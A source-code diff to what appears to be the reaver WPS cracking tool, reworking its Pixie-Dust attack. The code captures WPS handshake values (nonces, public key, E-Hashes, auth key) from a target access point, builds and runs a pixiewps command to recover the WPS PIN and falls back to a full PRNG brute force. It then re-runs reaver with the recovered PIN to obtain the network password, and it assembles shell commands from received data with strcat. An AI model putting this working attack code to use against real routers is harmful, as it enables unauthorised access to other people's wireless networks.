@@ -1394,6 +1394,20 @@ static struct wpabuf * wps_build_m2(struct wps_data *wps)
     wpa_hexdump(MSG_DEBUG, "WPS: Registrar Nonce",
             wps->nonce_r, WPS_NONCE_LEN);
     wpa_hexdump(MSG_DEBUG, "WPS: UUID-R", wps->uuid_r, WPS_UUID_LEN);
+    
+    
+    printf("[P] R-Nonce: ");
+    int pixiecnt = 0;
+    for (; pixiecnt < WPS_NONCE_LEN; pixiecnt++) 
+    {
+        printf("%02x", wps->nonce_r[pixiecnt]);
+        if (pixiecnt != WPS_NONCE_LEN - 1) {
+            printf(":");
+        }
+    }
+    printf("\n");
+    /******/
+    
 
     wpa_printf(MSG_DEBUG, "WPS: Building Message M2");
     msg = wpabuf_alloc(1000);
@@ -1698,30 +1712,19 @@ static int wps_process_enrollee_nonce(struct wps_data *wps, const u8 *e_nonce)
             wps->nonce_e, WPS_NONCE_LEN);
 
     /****** ADD THIS PART ******/
-    memset(cmd_pixie,0,sizeof(cmd_pixie));
     memset(cmd_pixie_aux,0,sizeof(cmd_pixie_aux));
-    strcat(cmd_pixie,"pixiewps ");
-   
-    if(globule->op_pixie==1 || globule->op_pixie==2 || globule->op_pixie==3)
-    {
-      strcat(cmd_pixie," -n "); 
-    }
+    memset(pixie_enonce,0,sizeof(pixie_enonce));
+
     printf("[P] E-Nonce: ");
     int pixiecnt = 0;
     for (; pixiecnt < WPS_NONCE_LEN; pixiecnt++) 
     {
         printf("%02x", wps->nonce_e[pixiecnt]);
-        if(globule->op_pixie==1 || globule->op_pixie==2 || globule->op_pixie==3)
-        {
-            sprintf(cmd_pixie_aux, "%02x",  wps->nonce_e[pixiecnt]);
-            strcat(cmd_pixie,cmd_pixie_aux);
-        }
+        sprintf(cmd_pixie_aux, "%02x",  wps->nonce_e[pixiecnt]);
+        strcat(pixie_enonce, cmd_pixie_aux);
         if (pixiecnt != WPS_NONCE_LEN - 1) {
             printf(":");
-            if(globule->op_pixie==1 || globule->op_pixie==2 || globule->op_pixie==3)
-            {
-                strcat(cmd_pixie,":");
-            }
+            strcat(pixie_enonce,":");
         }
     }
     printf("\n");
@@ -1731,19 +1734,18 @@ static int wps_process_enrollee_nonce(struct wps_data *wps, const u8 *e_nonce)
     return 0;
 }
 
+
 static int wps_process_registrar_nonce(struct wps_data *wps, const u8 *r_nonce)
 {
     if (r_nonce == NULL) {
         wpa_printf(MSG_DEBUG, "WPS: No Registrar Nonce received");
         return -1;
     }
-
     if (os_memcmp(wps->nonce_r, r_nonce, WPS_NONCE_LEN) != 0) {
         wpa_printf(MSG_DEBUG, "WPS: Invalid Registrar Nonce received");
         return -1;
     }
-
-    return 0;
+        return 0;
 }
 
 
@@ -1786,16 +1788,16 @@ static int wps_process_e_hash1(struct wps_data *wps, const u8 *e_hash1)
     wpa_hexdump(MSG_DEBUG, "WPS: E-Hash1", wps->peer_hash1, WPS_HASH_LEN);
 
     /****** ADD THIS PART ******/
-    strcat(cmd_pixie," -s ");
+    memset(pixie_ehash1,0,sizeof(pixie_ehash1));
     printf("[P] E-Hash1: ");
     int pixiecnt = 0;
     for (; pixiecnt < WPS_HASH_LEN; pixiecnt++) {
         printf("%02x", wps->peer_hash1[pixiecnt]);
         sprintf(cmd_pixie_aux, "%02x", wps->peer_hash1[pixiecnt]);
-        strcat(cmd_pixie,cmd_pixie_aux);
+        strcat(pixie_ehash1, cmd_pixie_aux);
         if (pixiecnt != WPS_HASH_LEN - 1) {
             printf(":");
-            strcat(cmd_pixie,":");
+            strcat(pixie_ehash1,":");
         }
     }
     printf("\n");
@@ -1817,35 +1819,47 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
     wpa_hexdump(MSG_DEBUG, "WPS: E-Hash2", wps->peer_hash2, WPS_HASH_LEN);
 
     /****** ADD THIS PART ******/
-    strcat(cmd_pixie," -z ");
+    memset(pixie_ehash2,0,sizeof(pixie_ehash2));
     printf("[P] E-Hash2: ");
     int pixiecnt = 0;
     for (; pixiecnt < WPS_HASH_LEN; pixiecnt++) {
         printf("%02x", wps->peer_hash2[pixiecnt]);
         sprintf(cmd_pixie_aux, "%02x",  wps->peer_hash2[pixiecnt]);
-        strcat(cmd_pixie,cmd_pixie_aux);
+        strcat(pixie_ehash2, cmd_pixie_aux);
         if (pixiecnt != WPS_HASH_LEN - 1) {
             printf(":");
-            strcat(cmd_pixie,":");
+            strcat(pixie_ehash2,":");
         }
     }
     printf("\n");
     /******/
+    
+    memset(cmd_pixie,0,sizeof(cmd_pixie));
+    
+    strcat(cmd_pixie,"pixiewps -e ");
+    strcat(cmd_pixie,pixie_pke);
+    strcat(cmd_pixie," -r ");
+    strcat(cmd_pixie,pixie_pkr);
+    strcat(cmd_pixie," -s ");
+    strcat(cmd_pixie,pixie_ehash1);
+    strcat(cmd_pixie," -z ");
+    strcat(cmd_pixie,pixie_ehash2);
+    strcat(cmd_pixie," -a ");
+    strcat(cmd_pixie,pixie_authkey);
+    strcat(cmd_pixie," -n ");
+    strcat(cmd_pixie,pixie_enonce);
+    
 
-    if(globule->op_pixie==1 || globule->op_pixie==2 || globule->op_pixie==3){
-        //strcat(cmd_pixie," -S ");
-        strcat(cmd_pixie," ");
+    if(globule->dh_small == 1){
+        strcat(cmd_pixie," -S ");
     }
-    //sprintf(cmd_pixie,"%s -S",cmd_pixie);
-	
+
 
     if(globule->op_pixie==1 || globule->op_pixie==2 || globule->op_pixie==3)
     {
         
         FILE *fpixe;
 		
-		//printf(" -- cmd pixie : %s",cmd_pixie);
-
         if ((fpixe = popen(cmd_pixie, "r")) == NULL) {
             printf("Error opening pipe!\n");
             //return -1;
@@ -1854,8 +1868,12 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
         int pixie_test=0;
         char pixie_pin[16];
         char *aux_pixie_pin;
+        int i=0;
         
         memset(pixie_pin, 0, sizeof(pixie_pin));
+        
+        printf("[+] Running pixiewps with the information, wait ...\n");   
+        //printf("Cmd : %s\n",cmd_pixie);
 
         while (fgets(pixie_buf_aux, 4000, fpixe) != NULL) 
         {
@@ -1866,33 +1884,106 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
             if(aux_pixie_pin != NULL)
             {
                 pixie_test = 0;
-                //exit(0);
+                break;
             }
+            
             
             aux_pixie_pin = strstr(pixie_buf_aux,"WPS pin:");
             if(aux_pixie_pin != NULL)
             {
                 pixie_test = 1;
-                //exit(0);
                 //here will get the pin
-                strncpy(pixie_pin, aux_pixie_pin+9, 8);
+                               
+                //a slightly better way to locate the pin
+                //thx offensive-security by attention
+                
+                for(i=0;i<strlen(aux_pixie_pin);i++)
+                {
+                    if(isdigit(aux_pixie_pin[i]))
+                    {
+                        strncpy(pixie_pin, aux_pixie_pin + i, 8);
+                        break;
+                    }
+                }
+                
+                break;
             }
             
         }
+        printf("[Pixie-Dust]\n");
 
         if(pclose(fpixe))  {
             //printf("Command not found or exited with error status\n");
             //return -1;
         }
+        
+        
+        if(pixie_test == 0)
+        {
+            //Pin not found, trying -f (full PRNG brute force)
+            
+            strcat(cmd_pixie," -f ");
+            
+            printf("[+] Pin not found, trying -f (full PRNG brute force), this may take around 30 minutes\n");   
+            //printf("Cmd : %s\n",cmd_pixie);
+            
+            if ((fpixe = popen(cmd_pixie, "r")) == NULL) {
+                printf("Error opening pipe!\n");
+                //return -1;
+            }
+            
+            while (fgets(pixie_buf_aux, 4000, fpixe) != NULL) 
+            {
+                
+                printf("[Pixie-Dust]  %s", pixie_buf_aux);
+
+                aux_pixie_pin = strstr(pixie_buf_aux,"WPS pin not found");
+                if(aux_pixie_pin != NULL)
+                {
+                    pixie_test = 0;
+                    break;
+                }
+                
+                aux_pixie_pin = strstr(pixie_buf_aux,"WPS pin:");
+                if(aux_pixie_pin != NULL)
+                {
+                    pixie_test = 1;
+                    
+                    //here will get the pin
+                    
+                    //a slightly better way to locate the pin
+                    //thx offensive-security by attention
+                    
+                    for(i=0;i<strlen(aux_pixie_pin);i++)
+                    {
+                        if(isdigit(aux_pixie_pin[i]))
+                        {
+                            strncpy(pixie_pin, aux_pixie_pin + i, 8);
+                            break;
+                        }
+                    }
+                    
+                    break;
+                }
+                
+            }
+            printf("[Pixie-Dust]\n");
+
+            if(pclose(fpixe))  {
+                //printf("Command not found or exited with error status\n");
+                //return -1;
+            }            
+            
+            
+            
+        }
+          
 
         if((pixie_test == 1) && (globule->op_autopass==1))
         {
             //here will make the test to get pass
 
             FILE *fpixe_test;
-
-            //strcat(globule->cmd_reaver_test," -p ");
-            //strcat(globule->cmd_reaver_test,pixie_pin);
             
             char cmd_reaver_test_aux[4000];
             char cmd_buf_c[5];
@@ -1910,7 +2001,7 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
             snprintf(cmd_buf_c, sizeof(cmd_buf_c), "%d",get_channel());
             strcat(cmd_reaver_test_aux,cmd_buf_c);
 
-            strcat(cmd_reaver_test_aux," -s y -p ");
+            strcat(cmd_reaver_test_aux," -s y -vv -p ");
             strcat(cmd_reaver_test_aux,pixie_pin);
             //printf("-- %s\n",cmd_reaver_test_aux);
 
@@ -1920,10 +2011,10 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
             }
             
 
-            printf("Running reaver with the correct pin, wait ...\n");
-            printf("Cmd : %s\n\n",cmd_reaver_test_aux);
-            printf("[Reaver Test] BSSID: %s\n", mac2str(get_bssid(),':'));
-            printf("[Reaver Test] Channel: %s\n", cmd_buf_c);
+            printf("[+] Running reaver with the correct pin, wait ...\n");
+            printf("[+] Cmd : %s\n",cmd_reaver_test_aux);
+            printf("[Reaver Test] [+] BSSID: %s\n", mac2str(get_bssid(),':'));
+            printf("[Reaver Test] [+] Channel: %s\n", cmd_buf_c);
             //printf("Command : \n", globule->cmd_reaver_test);
             while (fgets(pixie_buf_aux2, 4000, fpixe_test) != NULL) 
             {
@@ -1956,9 +2047,6 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
         }
 
     }
-
-    //printf(" %s ",cmd_pixie);
-   
 
     return 0;
 }
@@ -2093,23 +2181,22 @@ static int wps_process_pubkey(struct wps_data *wps, const u8 *pk,
         return -1;
 
     /****** ADD THIS PART ******/
-   // memset (cmd_pixie,0,sizeof(cmd_pixie));
-    strcat(cmd_pixie," -e ");
-    //sprintf( cmd_pixie, "", cmd_pixie, str2);
-
+   
+    memset(pixie_pke,0,sizeof(pixie_pke));
     printf("[P] PKE: ");
     int pixiecnt = 0;
     for (; pixiecnt < 192; pixiecnt++) {
         printf("%02x", pk[pixiecnt]);
         sprintf(cmd_pixie_aux, "%02x", pk[pixiecnt]);
-	strcat(cmd_pixie,cmd_pixie_aux);
+        strcat(pixie_pke, cmd_pixie_aux);
         if (pixiecnt != 191) {
             printf(":");
-            strcat(cmd_pixie,":");
+            strcat(pixie_pke,":");
         }
     }
     printf("\n");
     /******/
+
 
     return 0;
 }
